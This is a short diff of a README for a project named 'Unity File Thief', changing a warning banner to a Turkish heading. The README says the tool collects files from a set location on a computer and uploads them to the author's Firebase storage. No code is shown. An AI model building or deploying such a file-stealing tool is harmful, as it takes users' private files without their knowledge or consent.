@@ -1,4 +1,5 @@
-<font color="red"> It's Updating - You May Encounter Errors If You Use It.</font>  
+<font color="red"># Dikkat</font>
+
 
 ## Unity File Thief
 In Unity, Take a file on the computer and sent them to your firebase storage. Collect files on a spesific location.
